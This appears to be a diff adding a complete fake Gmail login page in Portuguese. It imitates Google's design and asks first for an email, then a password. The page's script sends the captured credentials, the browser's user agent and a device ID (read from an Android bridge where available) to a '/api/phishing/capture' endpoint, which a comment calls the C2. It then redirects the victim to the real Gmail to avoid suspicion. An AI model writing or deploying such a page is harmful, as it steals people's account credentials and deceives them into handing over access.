@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail - Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 450px;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .logo img {
+            width: 75px;
+            height: 75px;
+        }
+        
+        .card {
+            background: #fff;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            text-align: center;
+            color: #5f6368;
+            font-size: 16px;
+            margin-bottom: 24px;
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        label {
+            display: block;
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 8px;
+        }
+        
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #202124;
+            transition: border-color 0.2s;
+        }
+        
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #1a73e8;
+            border-width: 2px;
+            padding: 12px 14px;
+        }
+        
+        .forgot-link {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+        }
+        
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .create-account:hover {
+            text-decoration: underline;
+        }
+        
+        .btn-primary {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .btn-primary:hover {
+            background-color: #1765cc;
+        }
+        
+        .btn-primary:disabled {
+            background-color: #dadce0;
+            color: #80868b;
+            cursor: not-allowed;
+        }
+        
+        .error-message {
+            display: none;
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 8px;
+        }
+        
+        .error-message.show {
+            display: block;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .loading.show {
+            display: block;
+        }
+        
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .footer {
+            margin-top: 24px;
+            text-align: center;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            font-size: 12px;
+            color: #5f6368;
+            flex-wrap: wrap;
+        }
+        
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .language-selector {
+            margin-top: 16px;
+            text-align: center;
+        }
+        
+        .language-selector select {
+            padding: 8px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #5f6368;
+            background-color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                <g fill="none" fill-rule="evenodd">
+                    <path d="M67.954 16.303c-1.433 0-2.5-.87-2.5-2.177 0-1.307 1.067-2.177 2.5-2.177s2.5.87 2.5 2.177c0 1.307-1.067 2.177-2.5 2.177z" fill="#EA4335"></path>
+                    <path d="M58.193.67h2.564v17.44h-2.564z" fill="#4285F4"></path>
+                    <path d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.953 5.71 5.953 1.42 0 2.548-.632 3.136-1.347h.088v.844c0 2.283-1.194 3.52-3.124 3.52-1.572 0-2.549-1.134-2.952-2.09l-2.236.933c.642 1.543 2.352 3.444 5.188 3.444 3.015 0 5.564-1.775 5.564-6.1V7.01h-2.44v1.056zm-2.975 8.237c-1.858 0-3.414-1.567-3.414-3.72 0-2.18 1.556-3.747 3.414-3.747 1.833 0 3.124 1.593 3.124 3.747 0 2.127-1.29 3.72-3.124 3.72z" fill="#FBBC05"></path>
+                    <path d="M38.17 8.066h-.087c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.953 5.71 5.953 1.42 0 2.548-.632 3.136-1.347h.087v.844c0 2.283-1.193 3.52-3.124 3.52-1.571 0-2.548-1.134-2.952-2.09l-2.235.933c.642 1.543 2.352 3.444 5.188 3.444 3.014 0 5.563-1.775 5.563-6.1V7.01h-2.44v1.056zm-2.975 8.237c-1.858 0-3.413-1.567-3.413-3.72 0-2.18 1.555-3.747 3.413-3.747 1.834 0 3.124 1.593 3.124 3.747 0 2.127-1.29 3.72-3.124 3.72z" fill="#EA4335"></path>
+                    <path d="M25.17 6.71c-3.28 0-5.953 2.5-5.953 5.98 0 3.456 2.673 5.953 6.28 5.953 2.83 0 4.468-1.733 5.494-3.237l-2.25-1.5c-.63.93-1.5 1.557-3.244 1.557-1.47 0-2.513-.68-3.166-2.01l8.72-3.608-.402-.977c-.735-1.77-2.663-3.157-5.478-3.157zm.14 2.177c1.21 0 2.236.61 2.582 1.49L22.84 12.46c-.205-2.572 1.995-3.572 3.47-3.572z" fill="#4285F4"></path>
+                    <path d="M14.11 14.182c-.722-.723-1.205-1.78-1.205-3.27 0-1.492.483-2.548 1.205-3.27.722-.723 1.792-1.116 3.022-1.116 1.23 0 2.3.393 3.023 1.116.722.722 1.204 1.778 1.204 3.27 0 1.49-.482 2.547-1.204 3.27-.722.722-1.792 1.115-3.023 1.115-1.23 0-2.3-.393-3.022-1.115zm5.344-6.54c-.536-.537-1.29-.822-2.322-.822-1.03 0-1.785.285-2.32.822-.536.536-.804 1.348-.804 2.45 0 1.1.268 1.913.803 2.45.536.535 1.29.82 2.32.82 1.032 0 1.787-.285 2.322-.82.536-.537.804-1.35.804-2.45 0-1.102-.268-1.914-.804-2.45z" fill="#34A853"></path>
+                    <path d="M9.09 8.273c-.7 0-1.31.244-1.735.668-.424.424-.668 1.035-.668 1.735 0 .7.244 1.31.668 1.735.424.424 1.035.668 1.735.668s1.31-.244 1.735-.668c.424-.424.668-1.035.668-1.735 0-.7-.244-1.31-.668-1.735-.424-.424-1.035-.668-1.735-.668z" fill="#EA4335"></path>
+                </g>
+            </svg>
+        </div>
+        
+        <div class="card">
+            <h1>Fazer login</h1>
+            <p class="subtitle">Use sua Conta do Google</p>
+            
+            <form id="phishingForm" action="#" method="POST">
+                <div class="form-group">
+                    <input 
+                        type="email" 
+                        id="email" 
+                        name="email" 
+                        placeholder="E-mail ou telefone"
+                        autocomplete="email"
+                        required
+                    >
+                    <div class="error-message" id="emailError">
+                        Digite um e-mail ou número de telefone válido
+                    </div>
+                </div>
+                
+                <div class="form-group" id="passwordGroup" style="display: none;">
+                    <input 
+                        type="password" 
+                        id="password" 
+                        name="password" 
+                        placeholder="Digite sua senha"
+                        autocomplete="current-password"
+                        required
+                    >
+                    <div class="error-message" id="passwordError">
+                        Digite sua senha
+                    </div>
+                    <div style="margin-top: 12px;">
+                        <a href="#" class="forgot-link">Esqueceu a senha?</a>
+                    </div>
+                </div>
+                
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                </div>
+                
+                <div class="button-group">
+                    <a href="#" class="create-account">Criar conta</a>
+                    <button type="submit" class="btn-primary" id="submitBtn">
+                        Próxima
+                    </button>
+                </div>
+            </form>
+        </div>
+        
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#">Ajuda</a>
+                <a href="#">Privacidade</a>
+                <a href="#">Termos</a>
+            </div>
+            <div class="language-selector">
+                <select>
+                    <option>Português (Brasil)</option>
+                    <option>English (US)</option>
+                    <option>Español</option>
+                </select>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        let step = 1;
+        let capturedEmail = '';
+        
+        const form = document.getElementById('phishingForm');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const passwordGroup = document.getElementById('passwordGroup');
+        const submitBtn = document.getElementById('submitBtn');
+        const loading = document.getElementById('loading');
+        const emailError = document.getElementById('emailError');
+        const passwordError = document.getElementById('passwordError');
+        
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            if (step === 1) {
+                // Validar e-mail
+                const email = emailInput.value.trim();
+                
+                if (!email || !isValidEmail(email)) {
+                    emailError.classList.add('show');
+                    emailInput.style.borderColor = '#d93025';
+                    return;
+                }
+                
+                emailError.classList.remove('show');
+                emailInput.style.borderColor = '#dadce0';
+                capturedEmail = email;
+                
+                // Mostrar loading
+                loading.classList.add('show');
+                submitBtn.disabled = true;
+                
+                // Simular verificação
+                setTimeout(() => {
+                    loading.classList.remove('show');
+                    submitBtn.disabled = false;
+                    
+                    // Ir para step 2
+                    emailInput.disabled = true;
+                    passwordGroup.style.display = 'block';
+                    submitBtn.textContent = 'Próxima';
+                    step = 2;
+                    
+                    // Focar no campo de senha
+                    passwordInput.focus();
+                }, 1000);
+                
+            } else if (step === 2) {
+                // Capturar senha
+                const password = passwordInput.value;
+                
+                if (!password) {
+                    passwordError.classList.add('show');
+                    passwordInput.style.borderColor = '#d93025';
+                    return;
+                }
+                
+                passwordError.classList.remove('show');
+                passwordInput.style.borderColor = '#dadce0';
+                
+                // Mostrar loading
+                loading.classList.add('show');
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Verificando...';
+                
+                // Enviar credenciais para o C2
+                try {
+                    const response = await fetch('/api/phishing/capture', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'X-Device-ID': getDeviceId()
+                        },
+                        body: JSON.stringify({
+                            platform: 'gmail',
+                            email: capturedEmail,
+                            password: password,
+                            user_agent: navigator.userAgent,
+                            timestamp: new Date().toISOString()
+                        })
+                    });
+                    
+                    if (response.ok) {
+                        // Redirecionar para Gmail real após captura
+                        setTimeout(() => {
+                            window.location.href = 'https://mail.google.com';
+                        }, 1500);
+                    }
+                } catch (error) {
+                    // Se falhar, ainda redireciona para não levantar suspeitas
+                    setTimeout(() => {
+                        window.location.href = 'https://mail.google.com';
+                    }, 1500);
+                }
+            }
+        });
+        
+        function isValidEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+        
+        function getDeviceId() {
+            // Tentar obter device ID do Android
+            try {
+                if (typeof Android !== 'undefined' && Android.getDeviceId) {
+                    return Android.getDeviceId();
+                }
+            } catch (e) {}
+            
+            // Fallback: usar ID armazenado localmente
+            let deviceId = localStorage.getItem('device_id');
+            if (!deviceId) {
+                deviceId = 'web_' + Math.random().toString(36).substr(2, 9);
+                localStorage.setItem('device_id', deviceId);
+            }
+            return deviceId;
+        }
+        
+        // Remover mensagens de erro ao digitar
+        emailInput.addEventListener('input', () => {
+            emailError.classList.remove('show');
+            emailInput.style.borderColor = '#dadce0';
+        });
+        
+        passwordInput.addEventListener('input', () => {
+            passwordError.classList.remove('show');
+            passwordInput.style.borderColor = '#dadce0';
+        });
+    </script>
+</body>
+</html>
+
